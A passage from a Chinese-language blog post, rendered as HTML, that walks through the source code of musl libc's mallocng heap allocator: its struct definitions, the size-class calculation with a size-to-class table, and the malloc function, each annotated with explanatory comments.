class="hljs-title">meta</span>;</span>   <span class="hljs-comment">// 指向管理本 group 的 meta</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> active_idx:<span class="hljs-number">5</span>;     <span class="hljs-comment">// 5 bit</span><br><span class="hljs-type">char</span> pad[UNIT - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> meta *) - <span class="hljs-number">1</span>];     <span class="hljs-comment">// 16 字节对齐，使给用户的 storage[] 是对齐的</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> storage[];<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="meta"><a class="header-anchor" href="#meta">¶</a>meta</h3><p><em>malloc/mallocng/meta.h</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// meta 管理 group</span><br><span class="hljs-comment">// group 管理 chunk ，其中的 storage 就是给用户使用的部分</span><br><span class="hljs-comment">// meta 管理的 group 个数由 small_cnt_tab 数组指定</span><br><span class="hljs-comment">// meta 管理的 group 中每个 chunk 的大小固定，由 sizeclass 指定</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">prev</span>, *<span class="hljs-title">next</span>;</span>   <span class="hljs-comment">// 说明是双向链表</span><br>    <span class="hljs-comment">// 指向的 group 与 meta 内存页隔离，防止溢出攻击</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group</span> *<span class="hljs-title">mem</span>;</span><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> avail_mask, freed_mask;     <span class="hljs-comment">// 掩码的形式，用一个 bit 表示存在与否</span><br><span class="hljs-type">uintptr_t</span> last_idx:<span class="hljs-number">5</span>;<br><span class="hljs-type">uintptr_t</span> freeable:<span class="hljs-number">1</span>; <span class="hljs-comment">// 标识是否可以被 free</span><br><span class="hljs-type">uintptr_t</span> sizeclass:<span class="hljs-number">6</span>;      <span class="hljs-comment">// 管理的 group 大小，同一个 meta 中保持一致。如果 mem 是 mmap 分配固定为 63</span><br>                <span class="hljs-comment">//if (n &gt;= MMAP_THRESHOLD) &#123; ... g-&gt;sizeclass = 63;&#125;</span><br><span class="hljs-type">uintptr_t</span> maplen:<span class="hljs-number">8</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uintptr_t</span>)<span class="hljs-number">-12</span>;    <span class="hljs-comment">// 如果管理的 group 是 mmap 分配的，则为内存页数，否则为 0</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="meta-area"><a class="header-anchor" href="#meta-area">¶</a>meta_area</h3><p><em>malloc/mallocng/meta.h</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 单独申请一个内存页，页起始地址为一个 struct meta_area 结构，该内存页剩下的部分就是一个个 meta</span><br><span class="hljs-comment">//const struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta_area</span> &#123;</span><br><span class="hljs-type">uint64_t</span> check;     <span class="hljs-comment">// assert(area-&gt;check == ctx.secret);</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta_area</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> nslots;     <span class="hljs-comment">// 管理 meta 的个数 一般为定值</span><br>            <span class="hljs-comment">// ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots = (4096-sizeof(struct meta_area))/sizeof *m;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> <span class="hljs-title">slots</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="malloc-context"><a class="header-anchor" href="#malloc-context">¶</a>malloc_context</h3><p><em>malloc/mallocng/meta.h</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_context</span> &#123;</span><br><span class="hljs-type">uint64_t</span> secret;    <span class="hljs-comment">// ctx.secret = get_random_secret();</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PAGESIZE</span><br><span class="hljs-type">size_t</span> pagesize;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">int</span> init_done;  <span class="hljs-comment">//if (!ctx.init_done) &#123; 执行 init ... ctx.init_done = 1;&#125;</span><br><span class="hljs-type">unsigned</span> mmap_counter;  <span class="hljs-comment">// 使用 mmap 分配的次数</span><br>    <span class="hljs-comment">/********************************************************************************/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">free_meta_head</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">avail_meta</span>;</span>    <span class="hljs-comment">// meta_area 中管理的空闲的 meta 首地址</span><br><span class="hljs-type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;<span class="hljs-comment">// avail_meta_count 空闲的 meta 数量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta_area</span> *<span class="hljs-title">meta_area_head</span>, *<span class="hljs-title">meta_area_tail</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *avail_meta_areas;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">active</span>[48];</span>     <span class="hljs-comment">// 缓存可继续分配的 meta，类似 glibc 里的各种 bins</span><br><span class="hljs-type">size_t</span> usage_by_class[<span class="hljs-number">48</span>];   <span class="hljs-comment">// 对应大小的缓存的所有 meta 的 group 所管理的 chunk 个数</span><br><span class="hljs-type">uint8_t</span> unmap_seq[<span class="hljs-number">32</span>], bounces[<span class="hljs-number">32</span>];<br><span class="hljs-type">uint8_t</span> seq;<br><span class="hljs-type">uintptr_t</span> brk;   <span class="hljs-comment">// 记录目前的 sbrk(0) 即 Heap 的最高地址</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="Musl-mallocng-部分源码分析"><a class="header-anchor" href="#Musl-mallocng-部分源码分析">¶</a>Musl-mallocng 部分源码分析</h2><h3 id="size-to-class"><a class="header-anchor" href="#size-to-class">¶</a>size_to_class</h3><p>计算出来的 size_class 与 malloc_context 中的 <code>active[48]</code> 对应。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IB 4</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">uint16_t</span> size_classes[] = &#123;<br>    <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>,<br>    <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>,<br>    <span class="hljs-number">18</span>, <span class="hljs-number">20</span>, <span class="hljs-number">25</span>, <span class="hljs-number">31</span>,<br>    <span class="hljs-number">36</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">63</span>,<br>    <span class="hljs-number">72</span>, <span class="hljs-number">84</span>, <span class="hljs-number">102</span>, <span class="hljs-number">127</span>,<br>    <span class="hljs-number">146</span>, <span class="hljs-number">170</span>, <span class="hljs-number">204</span>, <span class="hljs-number">255</span>,<br>    <span class="hljs-number">292</span>, <span class="hljs-number">340</span>, <span class="hljs-number">409</span>, <span class="hljs-number">511</span>,<br>    <span class="hljs-number">584</span>, <span class="hljs-number">682</span>, <span class="hljs-number">818</span>, <span class="hljs-number">1023</span>,<br>    <span class="hljs-number">1169</span>, <span class="hljs-number">1364</span>, <span class="hljs-number">1637</span>, <span class="hljs-number">2047</span>,<br>    <span class="hljs-number">2340</span>, <span class="hljs-number">2730</span>, <span class="hljs-number">3276</span>, <span class="hljs-number">4095</span>,<br>    <span class="hljs-number">4680</span>, <span class="hljs-number">5460</span>, <span class="hljs-number">6552</span>, <span class="hljs-number">8191</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> small_cnt_tab[][<span class="hljs-number">3</span>] = &#123;<br>&#123; <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span> &#125;,<br>&#123; <span class="hljs-number">31</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span> &#125;,<br>&#123; <span class="hljs-number">20</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span> &#125;,<br>&#123; <span class="hljs-number">31</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span> &#125;,<br>&#123; <span class="hljs-number">25</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span> &#125;,<br>&#123; <span class="hljs-number">21</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span> &#125;,<br>&#123; <span class="hljs-number">18</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> &#125;,<br>&#123; <span class="hljs-number">31</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span> &#125;,<br>&#123; <span class="hljs-number">28</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span> &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a_ctz_32</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> x)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> a_clz_32</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">31</span>-a_clz_32(x&amp;-x);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> debruijn32[<span class="hljs-number">32</span>] = &#123;<br>        <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">29</span>, <span class="hljs-number">24</span>, <span class="hljs-number">19</span>, <span class="hljs-number">3</span>, <span class="hljs-number">30</span>, <span class="hljs-number">27</span>, <span class="hljs-number">25</span>, <span class="hljs-number">11</span>, <span class="hljs-number">20</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">13</span>,<br>        <span class="hljs-number">31</span>, <span class="hljs-number">22</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">26</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">21</span>, <span class="hljs-number">17</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>, <span class="hljs-number">16</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span><br>    &#125;;<br>    <span class="hljs-keyword">return</span> debruijn32[(x&amp;-x)*<span class="hljs-number">0x076be629</span> &gt;&gt; <span class="hljs-number">27</span>];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a_clz_32</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> x)</span><br>&#123;<br>    x &gt;&gt;= <span class="hljs-number">1</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">1</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">2</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">4</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">8</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">16</span>;<br>    x++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">31</span>-a_ctz_32(x);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_to_class</span><span class="hljs-params">(<span class="hljs-type">size_t</span> n)</span><br>&#123;<br>    n = (n+IB<span class="hljs-number">-1</span>)&gt;&gt;<span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (n&lt;<span class="hljs-number">10</span>) <span class="hljs-keyword">return</span> n;<br>    n++;<br>    <span class="hljs-type">int</span> i = (<span class="hljs-number">28</span>-a_clz_32(n))*<span class="hljs-number">4</span> + <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">if</span> (n&gt;size_classes[i+<span class="hljs-number">1</span>]) i+=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (n&gt;size_classes[i]) i++;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><p>计算完大概是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x0</span>     ~ <span class="hljs-number">0xc</span> -&gt;<span class="hljs-number">0</span><br><span class="hljs-number">0xd</span>     ~ <span class="hljs-number">0x1c</span> -&gt;<span class="hljs-number">1</span><br><span class="hljs-number">0x1d</span>    ~ <span class="hljs-number">0x2c</span> -&gt;<span class="hljs-number">2</span><br><span class="hljs-number">0x2d</span>    ~ <span class="hljs-number">0x3c</span> -&gt;<span class="hljs-number">3</span><br><span class="hljs-number">0x3d</span>    ~ <span class="hljs-number">0x4c</span> -&gt;<span class="hljs-number">4</span><br><span class="hljs-number">0x4d</span>    ~ <span class="hljs-number">0x5c</span> -&gt;<span class="hljs-number">5</span><br><span class="hljs-number">0x5d</span>    ~ <span class="hljs-number">0x6c</span> -&gt;<span class="hljs-number">6</span><br><span class="hljs-number">0x6d</span>    ~ <span class="hljs-number">0x7c</span> -&gt;<span class="hljs-number">7</span><br><span class="hljs-number">0x7d</span>    ~ <span class="hljs-number">0x8c</span> -&gt;<span class="hljs-number">8</span><br><span class="hljs-number">0x8d</span>    ~ <span class="hljs-number">0x9c</span> -&gt;<span class="hljs-number">9</span><br><span class="hljs-number">0x9d</span>    ~ <span class="hljs-number">0xbc</span> -&gt;<span class="hljs-number">10</span><br><span class="hljs-number">0xbd</span>    ~ <span class="hljs-number">0xec</span> -&gt;<span class="hljs-number">11</span><br><span class="hljs-number">0xed</span>    ~ <span class="hljs-number">0x11c</span> -&gt;<span class="hljs-number">12</span><br><span class="hljs-number">0x11d</span>   ~ <span class="hljs-number">0x13c</span> -&gt;<span class="hljs-number">13</span><br><span class="hljs-number">0x13d</span>   ~ <span class="hljs-number">0x18c</span> -&gt;<span class="hljs-number">14</span><br><span class="hljs-number">0x18d</span>   ~ <span class="hljs-number">0x1ec</span> -&gt;<span class="hljs-number">15</span><br><span class="hljs-number">0x1ed</span>   ~ <span class="hljs-number">0x23c</span> -&gt;<span class="hljs-number">16</span><br><span class="hljs-number">0x23d</span>   ~ <span class="hljs-number">0x29c</span> -&gt;<span class="hljs-number">17</span><br><span class="hljs-number">0x29d</span>   ~ <span class="hljs-number">0x31c</span> -&gt;<span class="hljs-number">18</span><br><span class="hljs-number">0x31d</span>   ~ <span class="hljs-number">0x3ec</span> -&gt;<span class="hljs-number">19</span><br><span class="hljs-number">0x3ed</span>   ~ <span class="hljs-number">0x47c</span> -&gt;<span class="hljs-number">20</span><br><span class="hljs-number">0x47d</span>   ~ <span class="hljs-number">0x53c</span> -&gt;<span class="hljs-number">21</span><br><span class="hljs-number">0x53d</span>   ~ <span class="hljs-number">0x65c</span> -&gt;<span class="hljs-number">22</span><br><span class="hljs-number">0x65d</span>   ~ <span class="hljs-number">0x7ec</span> -&gt;<span class="hljs-number">23</span><br><span class="hljs-number">0x7ed</span>   ~ <span class="hljs-number">0x91c</span> -&gt;<span class="hljs-number">24</span><br><span class="hljs-number">0x91d</span>   ~ <span class="hljs-number">0xa9c</span> -&gt;<span class="hljs-number">25</span><br><span class="hljs-number">0xa9d</span>   ~ <span class="hljs-number">0xcbc</span> -&gt;<span class="hljs-number">26</span><br><span class="hljs-number">0xcbd</span>   ~ <span class="hljs-number">0xfec</span> -&gt;<span class="hljs-number">27</span><br><span class="hljs-number">0xfed</span>   ~ <span class="hljs-number">0x123c</span> -&gt;<span class="hljs-number">28</span><br><span class="hljs-number">0x123d</span>  ~ <span class="hljs-number">0x153c</span> -&gt;<span class="hljs-number">29</span><br><span class="hljs-number">0x153d</span>  ~ <span class="hljs-number">0x198c</span> -&gt;<span class="hljs-number">30</span><br><span class="hljs-number">0x198d</span>  ~ <span class="hljs-number">0x1fec</span> -&gt;<span class="hljs-number">31</span><br><span class="hljs-number">0x1fed</span>  ~ <span class="hljs-number">0x247c</span> -&gt;<span class="hljs-number">32</span><br><span class="hljs-number">0x247d</span>  ~ <span class="hljs-number">0x2a9c</span> -&gt;<span class="hljs-number">33</span><br><span class="hljs-number">0x2a9d</span>  ~ <span class="hljs-number">0x331c</span> -&gt;<span class="hljs-number">34</span><br><span class="hljs-number">0x331d</span>  ~ <span class="hljs-number">0x3fec</span> -&gt;<span class="hljs-number">35</span><br><span class="hljs-number">0x3fed</span>  ~ <span class="hljs-number">0x490c</span> -&gt;<span class="hljs-number">36</span><br><span class="hljs-number">0x490d</span>  ~ <span class="hljs-number">0x553c</span> -&gt;<span class="hljs-number">37</span><br><span class="hljs-number">0x553d</span>  ~ <span class="hljs-number">0x664c</span> -&gt;<span class="hljs-number">38</span><br><span class="hljs-number">0x664d</span>  ~ <span class="hljs-number">0x7fec</span> -&gt;<span class="hljs-number">39</span><br><span class="hljs-number">0x7fed</span>  ~ <span class="hljs-number">0x923c</span> -&gt;<span class="hljs-number">40</span><br><span class="hljs-number">0x923d</span>  ~ <span class="hljs-number">0xaa9c</span> -&gt;<span class="hljs-number">41</span><br><span class="hljs-number">0xaa9d</span>  ~ <span class="hljs-number">0xccbc</span> -&gt;<span class="hljs-number">42</span><br><span class="hljs-number">0xccbd</span>  ~ <span class="hljs-number">0xffec</span> -&gt;<span class="hljs-number">43</span><br><span class="hljs-number">0xffed</span>  ~ <span class="hljs-number">0x1247c</span> -&gt;<span class="hljs-number">44</span><br><span class="hljs-number">0x1247d</span> ~ <span class="hljs-number">0x1553c</span> -&gt;<span class="hljs-number">45</span><br><span class="hljs-number">0x1553d</span> ~ <span class="hljs-number">0x1997c</span> -&gt;<span class="hljs-number">46</span><br></code></pre></td></tr></table></figure><h3 id="malloc"><a class="header-anchor" href="#malloc">¶</a>malloc</h3><p><em>malloc/mallocng/malloc.c</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> n)</span><br>&#123;<br><span class="hljs-keyword">if</span> (size_overflows(n)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">g</span>;</span><br><span class="hljs-type">uint32_t</span> mask, first;<br><span class="hljs-type">int</span> sc;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">int</span> ctr;<br><span class="hljs-comment">// #define MMAP_THRESHOLD 131052</span><br><span class="hljs-comment">// #define UNIT 16</span><br><span class="hljs-comment">// #define IB 4</span><br><span class="hljs-comment">// 如果走 mmap 分配（跳过）</span><br><span class="hljs-comment">/**************************************************************/</span><br><span class="hljs-keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;<br><span class="hljs-type">size_t</span> needed = n + IB + UNIT;<br><span class="hljs-type">void</span> *p = mmap(<span class="hljs-number">0</span>, needed, PROT_READ|PROT_WRITE,<br>MAP_PRIVATE|MAP_ANON, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (p==MAP_FAILED) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>wrlock();<br>step_seq();<br>g = alloc_meta();<br><span class="hljs-keyword">if</span> (!g) &#123;<br>unlock();<br>munmap(p, needed);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>g-&gt;mem = p;<br>g-&gt;mem-&gt;meta = g;<br>g-&gt;last_idx = <span class="hljs-number">0</span>;<br>g-&gt;freeable = <span class="hljs-number">1</span>;<br>g-&gt;sizeclass = <span class="hljs-number">63</span>;<br>g-&gt;maplen = (needed+<span class="hljs-number">4095</span>)/<span class="hljs-number">4096</span>;<br>g-&gt;avail_mask = g-&gt;freed_mask = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// use a global counter to cycle offset in</span><br><span class="hljs-comment">// individually-mmapped allocations.</span><br>ctx.mmap_counter++;<br>idx = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> success;<br>&#125;<br><span class="hljs-comment">/**************************************************************/</span><br><br>    <span class="hljs-comment">// 不走 mmap 则</span><br>sc = size_to_class(n);<br>rdlock();<br>g = ctx.active[sc];  <span class="hljs-comment">// 查找缓存 &quot;bins&quot; ，拿到 meta *g</span><br><br><span class="hljs-comment">// meta 为空且 4 =&lt; sc &lt;= 32 且不等于 6 且为偶数并且该 sc 没有正在使用的 chunk（?）</span><br><span class="hljs-comment">/**************************************************************/</span><br><span class="hljs-comment">// use coarse size classes initially when there are not yet</span><br><span class="hljs-comment">// any groups of desired size. this allows counts of 2 or 3</span><br><span class="hljs-comment">// to be allocated at first rather than having to start with</span><br><span class="hljs-comment">// 7 or 5, the min counts for even size classes.</span><br><span class="hljs-keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="hljs-number">4</span> &amp;&amp; sc&lt;<span class="hljs-number">32</span> &amp;&amp; sc!=<span class="hljs-number">6</span> &amp;&amp; !(sc&amp;<span class="hljs-number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;<br><span class="hljs-type">size_t</span> usage = ctx.usage_by_class[sc|<span class="hljs-number">1</span>];<br><span class="hljs-comment">// if a new group may be allocated, count it toward</span><br><span class="hljs-comment">// usage in deciding if we can use coarse class.</span><br><span class="hljs-keyword">if</span> (!ctx.active[sc|<span class="hljs-number">1</span>] || (!ctx.active[sc|<span class="hljs-number">1</span>]-&gt;avail_mask<br>    &amp;&amp; !ctx.active[sc|<span class="hljs-number">1</span>]-&gt;freed_mask))<br>usage += <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (usage &lt;= <span class="hljs-number">12</span>)<br>sc |= <span class="hljs-number">1</span>;<br>g = ctx.active[sc];<br>&#125;<br><span class="hljs-comment">/**************************************************************/</span><br><br><span class="hljs-keyword">for</span> (;;) &#123;<br>mask = g ? g-&gt;avail_mask : <span class="hljs-number">0</span>;<br>first = mask&amp;-mask;     <span class="hljs-comment">// 找到最低的为 1 的 bit 位</span><br><span class="hljs-keyword">if</span> (!first) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 没有 avail 的 chunk ， break</span><br><span class="hljs-keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)<br>g-&gt;avail_mask = mask-first;     <span class="hljs-comment">// 把 avail 这个 bit 置零 ， 为分配 chunk 做准备</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)<br><span class="hljs-keyword">continue</span>;<br>idx = a_ctz_32(first);  <span class="hljs-comment">// 计算 group 中的 chunk 下标</span><br><span class="hljs-keyword">goto</span> success;   <span class="hljs-comment">// 跳到分配 chunk</span><br>&#125;<br>upgradelock();<br><br>    <span class="hljs-comment">// 如果缓存中没有 avial 的 chunk ， 进一步申请</span><br>idx = alloc_slot(sc, n);<br><span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span>) &#123;<br>unlock();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>g = ctx.active[sc];     <span class="hljs-comment">// 刷新 g</span><br><br>success:<br>ctr = ctx.mmap_counter;<br>unlock();<br><span class="hljs-keyword">return</span> enframe(g, idx, n, ctr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="alloc-slot"><a class="header-anchor" href="#alloc-slot">¶</a>alloc_slot</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 